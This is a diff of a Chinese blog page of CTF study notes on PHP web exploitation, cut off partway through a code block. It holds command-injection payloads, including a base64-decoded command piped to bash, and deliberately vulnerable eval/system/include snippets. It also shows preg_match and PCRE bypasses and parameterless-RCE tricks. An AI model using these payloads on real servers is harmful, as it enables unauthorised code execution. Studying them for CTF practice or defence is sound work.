@@ -16,12 +16,12 @@
   <meta name="author" content="Zer0peach">
   <meta name="keywords" content="">
   
-    <meta name="description" content="读Boogipop大佬文章的具体尝试1.关于eval和system   （只尝试了php7.3.4）eval常规执行命令形如eval(system(&#39;whoami&#39;);); 当然不能直接这样运行，system(&#39;whoami&#39;);是传参进去的  （记得带;号） 123456#大佬给出的绕过技巧eval(system(&amp;#x27;ls&amp;#x27;)?&gt;)eval">
+    <meta name="description" content="读Boogipop大佬文章的具体尝试1.关于eval和system   （只尝试了php7.3.4）eval常规执行命令形如eval(system(&#39;whoami&#39;);); 当然不能直接这样运行，system(&#39;whoami&#39;);是传参进去的  （记得带;号） #大佬给出的绕过技巧 eval(system(&amp;#x27;ls&amp;#x27;)?&gt;) eval(?&amp;g">
 <meta property="og:type" content="article">
 <meta property="og:title" content="读Boogipop新人同学">
 <meta property="og:url" content="https://zer0peach.github.io/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/index.html">
 <meta property="og:site_name" content="My Blog">
-<meta property="og:description" content="读Boogipop大佬文章的具体尝试1.关于eval和system   （只尝试了php7.3.4）eval常规执行命令形如eval(system(&#39;whoami&#39;);); 当然不能直接这样运行，system(&#39;whoami&#39;);是传参进去的  （记得带;号） 123456#大佬给出的绕过技巧eval(system(&amp;#x27;ls&amp;#x27;)?&gt;)eval">
+<meta property="og:description" content="读Boogipop大佬文章的具体尝试1.关于eval和system   （只尝试了php7.3.4）eval常规执行命令形如eval(system(&#39;whoami&#39;);); 当然不能直接这样运行，system(&#39;whoami&#39;);是传参进去的  （记得带;号） #大佬给出的绕过技巧 eval(system(&amp;#x27;ls&amp;#x27;)?&gt;) eval(?&amp;g">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://zer0peach.github.io/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230901162551316.png">
 <meta property="og:image" content="https://zer0peach.github.io/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230901170008293.png">
@@ -55,7 +55,7 @@
 <meta property="og:image" content="https://zer0peach.github.io/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230903144926904.png">
 <meta property="og:image" content="https://zer0peach.github.io/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230903144942736.png">
 <meta property="article:published_time" content="2023-09-01T06:37:51.000Z">
-<meta property="article:modified_time" content="2023-09-03T07:33:51.553Z">
+<meta property="article:modified_time" content="2023-09-03T09:45:30.929Z">
 <meta property="article:author" content="Zer0peach">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://zer0peach.github.io/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230901162551316.png">
@@ -199,6 +199,18 @@
             </li>
           
         
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
         
           <li class="nav-item" id="search-btn">
             <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
@@ -251,7 +263,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          16k 字
+          15k 字
         
       </span>
     
@@ -262,7 +274,7 @@
         
         
         
-          131 分钟
+          129 分钟
         
       </span>
     
@@ -306,19 +318,40 @@
                 
                 <h1 id="读Boogipop大佬文章的具体尝试"><a href="#读Boogipop大佬文章的具体尝试" class="headerlink" title="读Boogipop大佬文章的具体尝试"></a>读Boogipop大佬文章的具体尝试</h1><h2 id="1-关于eval和system-（只尝试了php7-3-4）"><a href="#1-关于eval和system-（只尝试了php7-3-4）" class="headerlink" title="1.关于eval和system   （只尝试了php7.3.4）"></a>1.关于eval和system   （只尝试了php7.3.4）</h2><p>eval常规执行命令形如<code>eval(system(&#39;whoami&#39;););</code></p>
 <p>当然不能直接这样运行，<code>system(&#39;whoami&#39;);</code>是传参进去的  （记得带<code>;</code>号）</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#大佬给出的绕过技巧</span><br><span class="hljs-keyword">eval</span>(<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>)<span class="hljs-meta">?&gt;</span>)<br><span class="hljs-keyword">eval</span>(<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<span class="hljs-meta">?&gt;</span>)<br><span class="hljs-keyword">eval</span>(<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<span class="hljs-meta">?&gt;</span>;)<br><span class="hljs-keyword">eval</span>(<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>)<br><span class="hljs-keyword">eval</span>(<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?php</span>;)<br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-comment">#大佬给出的绕过技巧</span>
+<span class="hljs-keyword">eval</span>(<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>)<span class="hljs-meta">?&gt;</span>)
+<span class="hljs-keyword">eval</span>(<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<span class="hljs-meta">?&gt;</span>)
+<span class="hljs-keyword">eval</span>(<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<span class="hljs-meta">?&gt;</span>;)
+<span class="hljs-keyword">eval</span>(<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>)
+<span class="hljs-keyword">eval</span>(<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?php</span>;)</code></pre></div>
 
-<h3 id="在拼接的情况下执行命令"><a href="#在拼接的情况下执行命令" class="headerlink" title="在拼接的情况下执行命令"></a>在拼接的情况下执行命令</h3><h4 id="eval-中的参数被拼接"><a href="#eval-中的参数被拼接" class="headerlink" title="eval()中的参数被拼接"></a>eval()中的参数被拼接</h4><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;#&#x27;</span>.$_GET[<span class="hljs-string">&#x27;c&#x27;</span>])<span class="hljs-comment">;</span><br><span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;asd&#x27;</span>.$_GET[<span class="hljs-string">&#x27;c&#x27;</span>])<span class="hljs-comment">;</span><br><span class="hljs-built_in">eval</span>($_GET[<span class="hljs-string">&#x27;c&#x27;</span>].<span class="hljs-string">&quot;asd&quot;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
+<h3 id="在拼接的情况下执行命令"><a href="#在拼接的情况下执行命令" class="headerlink" title="在拼接的情况下执行命令"></a>在拼接的情况下执行命令</h3><h4 id="eval-中的参数被拼接"><a href="#eval-中的参数被拼接" class="headerlink" title="eval()中的参数被拼接"></a>eval()中的参数被拼接</h4><div class="code-wrapper"><pre><code class="hljs autoit"><span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;#&#x27;</span>.$_GET[<span class="hljs-string">&#x27;c&#x27;</span>])<span class="hljs-comment">;</span>
+<span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;asd&#x27;</span>.$_GET[<span class="hljs-string">&#x27;c&#x27;</span>])<span class="hljs-comment">;</span>
+<span class="hljs-built_in">eval</span>($_GET[<span class="hljs-string">&#x27;c&#x27;</span>].<span class="hljs-string">&quot;asd&quot;</span>)<span class="hljs-comment">;</span></code></pre></div>
 
-<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mel">第一种: 注释考虑换行绕过      payload:?c=%0asystem(<span class="hljs-string">&#x27;ls&#x27;</span>);<br>第二种: 考虑分割(; | &amp;)      payload:?c=;<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<br>第三种: 考虑注释后面内容      payload:?c=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<span class="hljs-comment">//</span><br>                          payload:?c=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);__HALT_COMPILER();<br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs mel">第一种: 注释考虑换行绕过      payload:?c=%0asystem(<span class="hljs-string">&#x27;ls&#x27;</span>);
+第二种: 考虑分割(; | &amp;)      payload:?c=;<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);
+第三种: 考虑注释后面内容      payload:?c=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<span class="hljs-comment">//</span>
+                          payload:?c=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);__HALT_COMPILER();</code></pre></div>
 
 <h4 id="system-中的拼接"><a href="#system-中的拼接" class="headerlink" title="system()中的拼接"></a>system()中的拼接</h4><p>好像换行注释什么的都不行，只考虑命令拼接符</p>
 <p>以下是个人尝试得出的结论，和网上的不同（有可能是windows环境的原因）(感觉我的都是歪理，其实有些地方也自相矛盾)</p>
-<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">;   理论上做题应该是万能的，但在本地尝试的时候,一点作用都没有<br>|<span class="hljs-string">   只输出最后一个</span>|<span class="hljs-string">后的命令，若前面有一个命令是错误的，则无法执行</span><br><span class="hljs-string"></span>||<span class="hljs-string">  只执行</span>||<span class="hljs-string">前的命令，后面的命令错误不影响执行，若</span>||<span class="hljs-string">前的命令是错误的，后面的仍无法执行,     若前面的命令是curl、net(可能是没有输出结果的指令),就能够执行</span>||<span class="hljs-string">后面的语句</span><br><span class="hljs-string"></span><br><span class="hljs-string">&amp;   命令都正确时，都可以执行，后面的错了，前面的能执行，前面的错了，都不能执行</span><br><span class="hljs-string">&amp;&amp;  命令都正确时，都可以执行，后面的错了，前面的能执行，前面的错了，都不能执行</span><br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs gherkin">;   理论上做题应该是万能的，但在本地尝试的时候,一点作用都没有
+|<span class="hljs-string">   只输出最后一个</span>|<span class="hljs-string">后的命令，若前面有一个命令是错误的，则无法执行</span>
+<span class="hljs-string"></span>||<span class="hljs-string">  只执行</span>||<span class="hljs-string">前的命令，后面的命令错误不影响执行，若</span>||<span class="hljs-string">前的命令是错误的，后面的仍无法执行,     若前面的命令是curl、net(可能是没有输出结果的指令),就能够执行</span>||<span class="hljs-string">后面的语句</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">&amp;   命令都正确时，都可以执行，后面的错了，前面的能执行，前面的错了，都不能执行</span>
+<span class="hljs-string">&amp;&amp;  命令都正确时，都可以执行，后面的错了，前面的能执行，前面的错了，都不能执行</span></code></pre></div>
 
-<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">system</span>(<span class="hljs-string">&quot;ls -all &quot;</span>.$this-&gt;filename);     <span class="hljs-comment">#DASCTF2023&amp;0X401比赛题</span><br><span class="hljs-keyword">system</span>($_GET[<span class="hljs-string">&#x27;file&#x27;</span>].<span class="hljs-string">&quot;aksldj&quot;</span>);<br><span class="hljs-keyword">system</span>(<span class="hljs-string">&quot;curl &quot;</span>.$_GET[<span class="hljs-string">&#x27;url&#x27;</span>].<span class="hljs-string">&quot;.dnslog.cn&quot;</span>);<br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs perl"><span class="hljs-keyword">system</span>(<span class="hljs-string">&quot;ls -all &quot;</span>.$this-&gt;filename);     <span class="hljs-comment">#DASCTF2023&amp;0X401比赛题</span>
+<span class="hljs-keyword">system</span>($_GET[<span class="hljs-string">&#x27;file&#x27;</span>].<span class="hljs-string">&quot;aksldj&quot;</span>);
+<span class="hljs-keyword">system</span>(<span class="hljs-string">&quot;curl &quot;</span>.$_GET[<span class="hljs-string">&#x27;url&#x27;</span>].<span class="hljs-string">&quot;.dnslog.cn&quot;</span>);</code></pre></div>
 
-<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gherkin"><span class="hljs-comment">#由于;我无法尝试，此处不讨论;能否使用</span><br><br>第一个: 大佬payload: ;echo bHMgLwo|<span class="hljs-string">base64 -d</span>|<span class="hljs-string">bash;    题目复现过，是可行的</span><br><span class="hljs-string">第二个: </span>||<span class="hljs-string">  &amp;  &amp;&amp; 三个都能使用</span><br><span class="hljs-string">第三个: 由于是curl,前面可以使用</span>||<span class="hljs-string">(直接</span>|<span class="hljs-string">也行),后面</span>||<span class="hljs-string">  &amp;  &amp;&amp; 三个都能使用</span><br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs gherkin"><span class="hljs-comment">#由于;我无法尝试，此处不讨论;能否使用</span>
+
+第一个: 大佬payload: ;echo bHMgLwo|<span class="hljs-string">base64 -d</span>|<span class="hljs-string">bash;    题目复现过，是可行的</span>
+<span class="hljs-string">第二个: </span>||<span class="hljs-string">  &amp;  &amp;&amp; 三个都能使用</span>
+<span class="hljs-string">第三个: 由于是curl,前面可以使用</span>||<span class="hljs-string">(直接</span>|<span class="hljs-string">也行),后面</span>||<span class="hljs-string">  &amp;  &amp;&amp; 三个都能使用</span></code></pre></div>
 
 <h2 id="data协议和input协议与include和highlight-file"><a href="#data协议和input协议与include和highlight-file" class="headerlink" title="data协议和input协议与include和highlight_file"></a>data协议和input协议与include和highlight_file</h2><blockquote>
 <p>data协议条件</p>
@@ -334,26 +367,44 @@
 </blockquote>
 <p>关于include能执行命令，我是模糊的，一直到2023SCTF的<code>fumo_backdoor</code>（与2022CISCN的考点相同），他们之间的区别是一个是include、一个是highlight_file（与题目的考点无关，但确实会对题目中的操作有影响），我在复现时看文章能写木马，但复现却不行，问了<code>unknown</code>师傅才知道，能执行代码完全靠的是<code>include</code>的函数，而<code>highlight_file</code>这类的就完全不行！</p>
 <p><code>include</code>能配合<code>data</code>、<code>input</code>伪协议进行命令执行，而<code>highlight_file</code>显示代码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(__file__);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;
+    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);
+&#125;
+<span class="hljs-keyword">else</span>&#123;
+    <span class="hljs-title function_ invoke__">highlight_file</span>(__file__);
+&#125;
+<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]))&#123;
+    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);
+&#125;
+<span class="hljs-meta">?&gt;</span></code></pre></div>
 
 <p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230901162551316.png" srcset="/img/loading.gif" lazyload alt="image-20230901162551316"></p>
 <h3 id="filter协议就不说了"><a href="#filter协议就不说了" class="headerlink" title="filter协议就不说了"></a>filter协议就不说了</h3><h3 id="Boogipop大佬总结"><a href="#Boogipop大佬总结" class="headerlink" title="Boogipop大佬总结"></a>Boogipop大佬总结</h3><p>所谓的什么伪协议流，其实就是读取文件或者写入内容到文件，并且储存到变量里面<br>不要搞混了哦</p>
-<h2 id="preg-match误区"><a href="#preg-match误区" class="headerlink" title="preg_match误区"></a>preg_match误区</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-variable">$str</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^flag/i&#x27;</span>, <span class="hljs-variable">$str</span>))&#123;<br> <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;yes&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span>  <br></code></pre></td></tr></table></figure>
+<h2 id="preg-match误区"><a href="#preg-match误区" class="headerlink" title="preg_match误区"></a>preg_match误区</h2><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+  <span class="hljs-variable">$str</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];
+<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^flag/i&#x27;</span>, <span class="hljs-variable">$str</span>))&#123;
+ <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;yes&#x27;</span>;
+&#125;
+<span class="hljs-meta">?&gt;</span></code></pre></div>
 
 <p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230901170008293.png" srcset="/img/loading.gif" lazyload alt="image-20230901170008293"></p>
 <p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230901165657391.png" srcset="/img/loading.gif" lazyload alt="image-20230901165657391"></p>
 <p>完了，为什么啊，与大佬结果不一样，（我测试了7.3.4和7.0.9和5.6.9三个版本都不回显）</p>
 <h3 id="m修饰符"><a href="#m修饰符" class="headerlink" title="m修饰符"></a>m修饰符</h3><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230901171700257.png" srcset="/img/loading.gif" lazyload alt="image-20230901171700257"></p>
 <p><code>m</code>是一定要搭配<code>^</code>或者<code>$</code>来使用的，匹配的是**<code>每一行</code>**的开头或结尾</p>
-<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">if</span><span class="hljs-params">(preg_match(<span class="hljs-string">&#x27;/^flag/im&#x27;</span>, <span class="hljs-variable">$str</span>)</span></span>)&#123;<br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">if</span><span class="hljs-params">(preg_match(<span class="hljs-string">&#x27;/^flag/im&#x27;</span>, <span class="hljs-variable">$str</span>)</span></span>)&#123;</code></pre></div>
 
 <p>所以无法用%0a进行绕过</p>
-<h3 id="preg-match的绕过技巧"><a href="#preg-match的绕过技巧" class="headerlink" title="preg_match的绕过技巧"></a>preg_match的绕过技巧</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">if</span> (preg_match(<span class="hljs-string">&#x27;/^flag$/&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>] !== <span class="hljs-string">&#x27;flag&#x27;</span>) &#123;<br>    <span class="hljs-attribute">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+<h3 id="preg-match的绕过技巧"><a href="#preg-match的绕过技巧" class="headerlink" title="preg_match的绕过技巧"></a>preg_match的绕过技巧</h3><div class="code-wrapper"><pre><code class="hljs nginx"><span class="hljs-attribute">if</span> (preg_match(<span class="hljs-string">&#x27;/^flag$/&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>] !== <span class="hljs-string">&#x27;flag&#x27;</span>) &#123;
+    <span class="hljs-attribute">echo</span> <span class="hljs-variable">$flag</span>;
+&#125;</code></pre></div>
 
 <p><code>?a=flag%0a</code></p>
 <h4 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h4><h4 id="PCRE回溯次数限制绕过"><a href="#PCRE回溯次数限制绕过" class="headerlink" title="PCRE回溯次数限制绕过"></a>PCRE回溯次数限制绕过</h4><p>一般是写脚本上传超过1000000的数据，就会被绕过</p>
 <h5 id="新了解的方法"><a href="#新了解的方法" class="headerlink" title="新了解的方法"></a>新了解的方法</h5><p><code>.htaccess</code>文件设置pcre回溯次数</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">php_value</span> pcre.backtrack_limit <span class="hljs-number">0</span><br><span class="hljs-attribute">php_value</span> pcre.jit <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">php_value</span> pcre.backtrack_limit <span class="hljs-number">0</span>
+<span class="hljs-attribute">php_value</span> pcre.jit <span class="hljs-number">0</span></code></pre></div>
 
 <p>将正则匹配的回溯次数设为0，来达到绕过的效果</p>
 <h4 id="限制次数绕过"><a href="#限制次数绕过" class="headerlink" title="限制次数绕过"></a>限制次数绕过</h4><p><code>preg_match(&#39;/[0-9a-zA-Z]&#123;2&#125;/&#39;,$p) === 1</code>（匹配到两次）</p>
@@ -361,39 +412,117 @@
 <p>payload：<code>p=&#39;Z&#39;m&#39;x&#39;h&#39;Z&#39;y&#39;5&#39;w&#39;a&#39;H&#39;A&#39;=</code></p>
 <h2 id="parse-str"><a href="#parse-str" class="headerlink" title="parse_str"></a>parse_str</h2><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230901174857243.png" srcset="/img/loading.gif" lazyload alt="image-20230901174857243"></p>
 <p>根据<code>&amp;</code>解析变量</p>
-<figure class="highlight zephir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs zephir">parse_str(<span class="hljs-string">&quot;a=1%26b=2%26c=3&quot;</span>);     <span class="hljs-string">&#x27;a&#x27;</span> =&gt; <span class="hljs-keyword">string</span> <span class="hljs-string">&#x27;1&amp;b=2&amp;c=3&#x27;</span><br><br>parse_str(<span class="hljs-string">&quot;a=1&amp;b=2&amp;c=3&quot;</span>);<br><span class="hljs-string">&#x27;a&#x27;</span> =&gt; <span class="hljs-keyword">string</span> <span class="hljs-string">&#x27;1&#x27;</span><br><span class="hljs-string">&#x27;b&#x27;</span> =&gt; <span class="hljs-keyword">string</span> <span class="hljs-string">&#x27;2&#x27;</span><br><span class="hljs-string">&#x27;c&#x27;</span> =&gt; <span class="hljs-keyword">string</span> <span class="hljs-string">&#x27;3&#x27;</span><br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs zephir">parse_str(<span class="hljs-string">&quot;a=1%26b=2%26c=3&quot;</span>);     <span class="hljs-string">&#x27;a&#x27;</span> =&gt; <span class="hljs-keyword">string</span> <span class="hljs-string">&#x27;1&amp;b=2&amp;c=3&#x27;</span>
+
+parse_str(<span class="hljs-string">&quot;a=1&amp;b=2&amp;c=3&quot;</span>);
+<span class="hljs-string">&#x27;a&#x27;</span> =&gt; <span class="hljs-keyword">string</span> <span class="hljs-string">&#x27;1&#x27;</span>
+<span class="hljs-string">&#x27;b&#x27;</span> =&gt; <span class="hljs-keyword">string</span> <span class="hljs-string">&#x27;2&#x27;</span>
+<span class="hljs-string">&#x27;c&#x27;</span> =&gt; <span class="hljs-keyword">string</span> <span class="hljs-string">&#x27;3&#x27;</span></code></pre></div>
 
 <h2 id="无参数RCE"><a href="#无参数RCE" class="headerlink" title="无参数RCE"></a>无参数RCE</h2><p>取反、异或都需要php7的环境（确实好像php5用不了）</p>
 <h4 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h4><p>大佬给出的异或脚本真好用，嘿嘿</p>
 <h4 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h4><p>php取反很方便</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-string">&#x27;phpinfo&#x27;</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-string">&#x27;phpinfo&#x27;</span>);<span class="hljs-meta">?&gt;</span></code></pre></div>
 
 <h4 id="自增"><a href="#自增" class="headerlink" title="自增"></a>自增</h4><p><code>[].[]</code>返回ArrayArray          <code>_/_</code>返回NAN</p>
 <p>由此自增构造字符</p>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-variable">$%</span><span class="hljs-variable constant_">DF</span>=(_/_._)[<span class="hljs-string">&#x27;!&#x27;</span>==<span class="hljs-string">&#x27;_&#x27;</span>];<span class="hljs-regexp">//</span><span class="hljs-variable constant_">NAN</span><br><span class="hljs-variable">$_</span>=++<span class="hljs-variable">$%</span><span class="hljs-variable constant_">DF</span>;    <span class="hljs-regexp">//</span>O<br><span class="hljs-variable">$%</span><span class="hljs-variable constant_">DE</span>=_;     <span class="hljs-regexp">//</span>_<br><span class="hljs-variable">$%</span><span class="hljs-variable constant_">DE</span>.=++<span class="hljs-variable">$_</span>.<span class="hljs-variable">$%</span><span class="hljs-variable constant_">DF</span>;   <span class="hljs-regexp">//</span>_P<br><span class="hljs-variable">$_</span>++;   <span class="hljs-regexp">//</span>Q<br><span 